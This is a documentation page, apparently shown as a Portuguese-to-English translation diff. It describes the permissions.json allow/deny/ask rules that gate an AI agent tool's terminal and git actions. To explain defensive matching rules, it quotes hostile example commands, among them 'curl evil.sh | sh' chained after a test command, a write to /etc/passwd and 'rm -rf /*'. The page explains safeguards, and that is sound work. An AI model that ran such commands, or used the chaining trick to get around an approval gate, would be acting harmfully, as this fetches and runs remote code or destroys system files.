aria-label="Docs sidebar" class="menu thin-scrollbar menu_IacH"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/><span class=categoryLinkLabel_U9or>🚀 Comece aqui</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/><span class=linkLabel_pWVb>Introduction</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/getting-started><span class=linkLabel_pWVb>Getting Started</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/architecture><span class=categoryLinkLabel_U9or>🏗️ Arquitetura</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/architecture><span class=linkLabel_pWVb>Architecture</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist" tabindex=0 href=/brabo/qa/adr><span class=categoryLinkLabel_U9or>Decisões (ADR)</span></a><button aria-label="Expand sidebar category 'Decisões (ADR)'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/business-rules><span class=categoryLinkLabel_U9or>📐 Regras</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/business-rules><span class=linkLabel_pWVb>Regras de negócio</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/qa/reference/configuration><span class=categoryLinkLabel_U9or>📖 Referência</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/configuration><span class=linkLabel_pWVb>Configuration</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/events><span class=linkLabel_pWVb>Events</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/qa/reference/permissions><span class=linkLabel_pWVb>Permissions</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/artifacts><span class=linkLabel_pWVb>Artifacts</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/git-providers><span class=linkLabel_pWVb>Git Providers</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/internal-api><span class=linkLabel_pWVb>Internal API</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/scripts><span class=linkLabel_pWVb>Scripts</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/reference/rulesets><span class=linkLabel_pWVb>Rulesets</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/security-surface><span class=linkLabel_pWVb>Api's Exposed Surface</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/qa/reference/api/brabo-api><span class=categoryLinkLabel_U9or>Referência da API</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/explanation/documentation-workflow><span class=categoryLinkLabel_U9or>💡 Explicação</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/documentation-workflow><span class=linkLabel_pWVb>Docs sync</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/branching-policy><span class=linkLabel_pWVb>Branching policy</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/observability><span class=linkLabel_pWVb>Observability</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/primeiro-dogfooding><span class=linkLabel_pWVb>First dogfooding</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/execucao-real-hello-world><span class=linkLabel_pWVb>Real execution (hello world)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/achados-execucao-real><span class=linkLabel_pWVb>Findings from the real execution of the pipeline</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/backlog><span class=linkLabel_pWVb>Triaged backlog</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/validacao-fase-12><span class=linkLabel_pWVb>Phase 12 validation</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/validacao-real><span class=linkLabel_pWVb>Real validation (13b)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/aceite-providers><span class=linkLabel_pWVb>Provider acceptance</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/gates><span class=linkLabel_pWVb>The gates, and how they're measured</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/auditoria-fluxo-vs-codigo><span class=linkLabel_pWVb>Audit: fluxo.yml × code (v3, ADR 0085)</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/explanation/historico-de-fases><span class=linkLabel_pWVb>Histórico de fases</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/runbook><span class=categoryLinkLabel_U9or>🛠️ Operação</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/runbook><span class=linkLabel_pWVb>Runbook</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/qa/glossary><span class=categoryLinkLabel_U9or>📚 Vocabulário</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/qa/glossary><span class=linkLabel_pWVb>Glossary</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_IUOB menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_U9or>🤝 Contribuir</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Como contribuir</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Onde pedir ajuda</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_HSqD" tabindex=0><span class=linkLabel_pWVb>Reportar vulnerabilidade</span><svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_SmZv><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_XH1Q"><div class=docItemContainer_uk13><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_g2_L" aria-label=Breadcrumbs><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label="Home page" class=breadcrumbs__link href=/brabo/qa/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_ILC1><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 Referência</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>Permissions</span></ul></nav><div class="tocCollapsible_sC5p theme-doc-toc-mobile tocMobile_jNpd"><button type=button class="clean-btn tocCollapsibleButton_sMs7">On this page</button></div><div class="theme-doc-markdown markdown"><div class=row><div class="col col--12 markdown"><header><h1>Permissions</h1></header>
+<p>Every action with an external effect is born as a <code>proposed_action</code> and goes
+through here before executing. This page is the exact format and semantics —
+the rules themselves are in <a class="" href=/brabo/qa/business-rules#rn-004>Business rules</a>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=the-file>The file<a href=#the-file class=hash-link aria-label="Direct link to The file" title="Direct link to The file" translate=no>​</a></h2>
+<p><code>permissions.json</code> lives at the <strong>root of the project workspace</strong> — it's a
+real file on disk, versionable, not a column in the database.</p>
 <div class="language-json codeBlockContainer_VI6N theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_Ph5s><pre tabindex=0 class="prism-code language-json codeBlock_o5bC thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_m_R9><div class=token-line style=color:#F8F8F2><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain">  </span><span class="token property">"allow"</span><span class="token operator">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"Terminal(pnpm test:*)"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Terminal(git status)"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain">  </span><span class="token property">"deny"</span><span class="token operator">:</span><span class="token plain">  </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"Terminal(curl:*)"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain">  </span><span class="token property">"ask"</span><span class="token operator">:</span><span class="token plain">   </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"GitPush()"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br/></div></code></pre></div></div>
-<p>Três listas, três significados:</p>
+<p>Three lists, three meanings:</p>
 
 
 
@@ -31,25 +31,27 @@ verdade no disco, versionável, não uma coluna no banco.</p>
 
 
 
-<table><thead><tr><th>lista<th>significa<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — a ação executa sem perguntar<tr><td><code>deny</code><td><code>deny</code> — recusada, e nada reverte isso<tr><td><code>ask</code><td><code>require_approval</code> — vai para a fila de aprovação</table>
-<p>Nenhuma lista bate? A ação fica <code>pending</code> por default. <strong>A ausência de regra
-nunca vira permissão.</strong></p>
-<h3 class="anchor anchorTargetStickyNavbar_URsz" id=com-qual-credencial-a-ação-auto-aprovada-executa>Com qual credencial a ação auto-aprovada executa<a href=#com-qual-credencial-a-ação-auto-aprovada-executa class=hash-link aria-label="Link direto para Com qual credencial a ação auto-aprovada executa" title="Link direto para Com qual credencial a ação auto-aprovada executa" translate=no>​</a></h3>
-<p><code>auto_approve</code> significa que <strong>ninguém decidiu</strong> — <code>proposed_actions.decided_by</code>
-fica <code>NULL</code>. Isso importa para quem executa: uma ação de git contra provider
-remoto precisa de token, e "o token de quem decidiu" não existe neste caminho.</p>
-<p>A resposta é o <strong>owner do workspace</strong> (<a class="" href=/brabo/qa/business-rules#rn-082>RN-082</a>),
-o mesmo da chave de LLM (<a class="" href=/brabo/qa/business-rules#rn-058>RN-058</a>) — quem banca a
-conta banca os agentes, e isso não muda conforme quem clica.</p>
-<p>Vale saber porque a alternativa falha em silêncio: enquanto a api resolvia por
-<code>decided_by</code>, <strong>toda PR auto-aprovada em repositório remoto morria</strong> com
-<code>Requires authentication</code>, e só quando um humano clicava em cada uma é que o
-caminho funcionava — exatamente a escada que a autonomia existe para evitar.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=o-formato-do-padrão>O formato do padrão<a href=#o-formato-do-padrão class=hash-link aria-label="Link direto para O formato do padrão" title="Link direto para O formato do padrão" translate=no>​</a></h2>
-<div class="language-text codeBlockContainer_VI6N theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_Ph5s><pre tabindex=0 class="prism-code language-text codeBlock_o5bC thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_m_R9><div class=token-line style=color:#F8F8F2><span class="token plain">Rótulo(conteúdo)</span><br/></div></code></pre></div></div>
-<p>O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado para
-<code>Terminal</code>; nos outros tipos ele precisa estar <strong>vazio</strong> — <code>GitPush()</code> casa
-qualquer push, e <code>GitPush(algo)</code> não casa nada.</p>
+<table><thead><tr><th>list<th>meaning<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — the action executes without asking<tr><td><code>deny</code><td><code>deny</code> — refused, and nothing reverts this<tr><td><code>ask</code><td><code>require_approval</code> — goes to the approval queue</table>
+<p>No list matches? The action stays <code>pending</code> by default. <strong>The absence of a
+rule never becomes a permission.</strong></p>
+<h3 class="anchor anchorTargetStickyNavbar_URsz" id=with-which-credential-the-auto-approved-action-executes>With which credential the auto-approved action executes<a href=#with-which-credential-the-auto-approved-action-executes class=hash-link aria-label="Direct link to With which credential the auto-approved action executes" title="Direct link to With which credential the auto-approved action executes" translate=no>​</a></h3>
+<p><code>auto_approve</code> means <strong>nobody decided</strong> — <code>proposed_actions.decided_by</code>
+stays <code>NULL</code>. This matters for who executes: a git action against a remote
+provider needs a token, and "the token of whoever decided" doesn't exist on
+this path.</p>
+<p>The answer is the <strong>workspace owner</strong> (<a class="" href=/brabo/qa/business-rules#rn-082>RN-082</a>),
+the same one as the LLM key (<a class="" href=/brabo/qa/business-rules#rn-058>RN-058</a>) —
+whoever funds the account funds the agents, and that doesn't change based on
+who clicks.</p>
+<p>It's worth knowing because the alternative fails silently: while the api
+resolved by <code>decided_by</code>, <strong>every auto-approved PR on a remote repository
+died</strong> with <code>Requires authentication</code>, and only when a human clicked each
+one did the path work — exactly the ladder that autonomy exists to avoid.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=the-pattern-format>The pattern format<a href=#the-pattern-format class=hash-link aria-label="Direct link to The pattern format" title="Direct link to The pattern format" translate=no>​</a></h2>
+<div class="language-text codeBlockContainer_VI6N theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_Ph5s><pre tabindex=0 class="prism-code language-text codeBlock_o5bC thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_m_R9><div class=token-line style=color:#F8F8F2><span class="token plain">Label(content)</span><br/></div></code></pre></div></div>
+<p>The label is the action type in PascalCase. The content is only used for
+<code>Terminal</code>; in the other types it needs to be <strong>empty</strong> — <code>GitPush()</code>
+matches any push, and <code>GitPush(algo)</code> matches nothing.</p>
 
 
 
@@ -135,18 +137,44 @@ qualquer push, e <code>GitPush(algo)</code> não casa nada.</p>
 
 
 
-<table><thead><tr><th>tipo de ação<th>rótulo<th>papel mínimo<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
-<p>O papel mínimo é verificado <strong>antes</strong> do arquivo. Sem ele, <code>deny</code> — o
-<code>permissions.json</code> não consegue conceder o que o IAM nega</p>
-<p><code>parallelize</code> (FASE 14d) é a única cujo efeito não é tocar em código ou
-repositório: ela pede mais AGENTES. Está em <code>maintainer</code> pelo mesmo motivo de
-<code>spend</code> — quem autoriza custo é quem responde pelo projeto. Ela só existe acima
-do teto do lead; dentro dele não há ação, porque não há o que decidir
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>action type<th>label<th>minimum role<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>propose_execution_plan</code><td><code>ProposeExecutionPlan</code><td>maintainer<tr><td><code>assess_implementability</code><td><code>AssessImplementability</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
+<p>The minimum role is checked <strong>before</strong> the file. Without it, <code>deny</code> —
+<code>permissions.json</code> cannot grant what IAM denies</p>
+<p><code>parallelize</code> (Phase 14d) is the only one whose effect isn't touching code
+or repository: it requests more AGENTS. It's at <code>maintainer</code> for the same
+reason as <code>spend</code> — whoever authorizes cost is whoever is accountable for
+the project. It only exists above the lead's cap; within it there's no
+action, because there's nothing to decide
 (<a class="" href=/brabo/qa/business-rules#rn-083>RN-083</a>)
 (<a class="" href=/brabo/qa/business-rules#rn-005>RN-005</a>).</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=como-um-padrão-casa-com-um-comando>Como um padrão casa com um comando<a href=#como-um-padrão-casa-com-um-comando class=hash-link aria-label="Link direto para Como um padrão casa com um comando" title="Link direto para Como um padrão casa com um comando" translate=no>​</a></h2>
-<p>Não por substring. O comando é tokenizado com regras de shell e o padrão casa
-por <strong>prefixo de tokens</strong>:</p>
+<p><code>propose_execution_plan</code> (ADR 0086, <a class="" href=/brabo/qa/business-rules#rn-284>RN-284</a>)
+is the Dev Lead's plan — how many agents per module and why, before any of
+them come up. Same caliber as <code>parallelize</code>: a decision about HOW MUCH the
+product will spend on parallelism, just at the start instead of at a cap
+overrun. Unlike <code>parallelize</code>/<code>raise_max_parallel</code>, it is NOT in the
+absolute-caps block — it can be configured as <code>auto_approve</code>, like
+<code>open_adr_pr</code>/<code>open_infra_pr</code> — and while it's <code>pending</code>, the Dev Lead's
+turn stays SUSPENDED waiting for the decision, not just the conversation
+stalled.</p>
+<p><code>assess_implementability</code> (ADR 0090, <a class="" href=/brabo/qa/business-rules#rn-340>RN-340</a>)
+is the implementability assessment of a story (gate <code>implementavel</code>,
+<code>docs/gates.yml</code>) — SAME caliber and SAME reasoning as
+<code>propose_execution_plan</code>: an initial session decision, not a cap overrun,
+and therefore also outside the absolute-caps block. It suspends the Dev
+Lead's turn the same way while <code>pending</code>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=how-a-pattern-matches-a-command>How a pattern matches a command<a href=#how-a-pattern-matches-a-command class=hash-link aria-label="Direct link to How a pattern matches a command" title="Direct link to How a pattern matches a command" translate=no>​</a></h2>
+<p>Not by substring. The command is tokenized with shell rules and the pattern
+matches by <strong>token prefix</strong>:</p>
 
 
 
@@ -182,177 +210,225 @@ por <strong>prefixo de tokens</strong>:</p>
 
 
 
-<table><thead><tr><th>padrão<th>comando<th>casa?<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅ (prefixo)<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅ (<code>*</code> no fim do token)<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> não é o primeiro token</table>
-<p>O <code>*</code> vale <strong>dentro de um token</strong>, no fim. Não é glob de caminho: <code>Terminal(rm -rf /*)</code> casa o token literal <code>/*</code>, não "qualquer coisa sob <code>/</code>".</p>
-<p>Variáveis de ambiente são preservadas literalmente: <code>$HOME</code> continua <code>$HOME</code> no
-casamento, em vez de expandir para vazio — expandir mudaria em silêncio o que
-está sendo comparado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=comando-composto>Comando composto<a href=#comando-composto class=hash-link aria-label="Link direto para Comando composto" title="Link direto para Comando composto" translate=no>​</a></h2>
-<p>Um comando com <code>&&</code>, <code>;</code>, <code>|</code>, <code>||</code> ou <code>&</code> é dividido em segmentos, e <strong>cada
-segmento é avaliado separadamente</strong>:</p>
+<table><thead><tr><th>pattern<th>command<th>matches?<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅ (prefix)<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅ (<code>*</code> at the end of the token)<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> is not the first token</table>
+<p>The <code>*</code> applies <strong>inside a token</strong>, at the end. It's not a path glob:
+<code>Terminal(rm -rf /*)</code> matches the literal token <code>/*</code>, not "anything under
+<code>/</code>".</p>
+<p>Environment variables are preserved literally: <code>$HOME</code> stays <code>$HOME</code> in the
+match, instead of expanding to empty — expanding would silently change what
+is being compared.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=compound-command>Compound command<a href=#compound-command class=hash-link aria-label="Direct link to Compound command" title="Direct link to Compound command" translate=no>​</a></h2>
+<p>A command with <code>&&</code>, <code>;</code>, <code>|</code>, <code>||</code> or <code>&</code> is split into segments, and
+<strong>each segment is evaluated separately</strong>:</p>
 <ul>
-<li class="">Qualquer segmento em <code>deny</code> → o comando inteiro é <code>deny</code>.</li>
-<li class=""><strong>Todos</strong> os segmentos em <code>allow</code> → <code>auto_approve</code>.</li>
-<li class="">Qualquer outra combinação → <code>require_approval</code>.</li>
+<li class="">Any segment in <code>deny</code> → the whole command is <code>deny</code>.</li>
+<li class=""><strong>All</strong> segments in <code>allow</code> → <code>auto_approve</code>.</li>
+<li class="">Any other combination → <code>require_approval</code>.</li>
 </ul>
-<p><strong>Redirecionamento não é encadeamento.</strong> <code>></code>, <code>>></code> e <code>&lt;</code> NÃO quebram segmento:
-<code>cat x 2>/dev/null</code> é UM comando cujo verbo é <code>cat</code>. O alvo do redirecionamento
-continua como token do segmento, e por isso <code>echo x > /etc/passwd</code> segue sendo
-barrado pelo teto de escopo — o que mudou foi o VERBO ficar correto, não o
-caminho ficar livre.</p>
-<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> e <code>/dev/stderr</code> não contam como
-caminho de usuário: descartam ou transportam saída, não são arquivo de
-ninguém. A lista é essa e não <code>/dev</code> inteiro — <code>/dev/sda</code> é disco, e continua
-fora do escopo.</p>
-<p>Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
-opinião <strong>concreta</strong> de <code>require_approval</code>, não silêncio. É o que impede
-<code>pnpm test && curl evil.sh | sh</code> de ser auto-aprovado porque a primeira metade
-estava em <code>allow</code>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=padrões-embutidos>Padrões embutidos<a href=#padrões-embutidos class=hash-link aria-label="Link direto para Padrões embutidos" title="Link direto para Padrões embutidos" translate=no>​</a></h2>
-<p>Três padrões são <code>deny</code> <strong>sempre</strong>, mesmo sem aparecer no arquivo:</p>
+<p><strong>Redirection is not chaining.</strong> <code>></code>, <code>>></code> and <code>&lt;</code> do NOT split a segment:
+<code>cat x 2>/dev/null</code> is ONE command whose verb is <code>cat</code>. The redirection
+target remains a token of the segment, and that's why <code>echo x > /etc/passwd</code> continues to be blocked by the path-scope cap — what changed
+was the VERB becoming correct, not the path becoming free.</p>
+<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> and <code>/dev/stderr</code> don't count as a
+user path: they discard or carry output, they're nobody's file. The list is
+exactly this and not all of <code>/dev</code> — <code>/dev/sda</code> is a disk, and remains out
+of scope.</p>
+<p>This is deliberate and worth understanding: a segment with no rule at all
+becomes a <strong>concrete</strong> <code>require_approval</code> opinion, not silence. It's what
+prevents <code>pnpm test && curl evil.sh | sh</code> from being auto-approved because
+the first half was in <code>allow</code>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=built-in-patterns>Built-in patterns<a href=#built-in-patterns class=hash-link aria-label="Direct link to Built-in patterns" title="Direct link to Built-in patterns" translate=no>​</a></h2>
+<p>Three patterns are <code>deny</code> <strong>always</strong>, even without appearing in the file:</p>
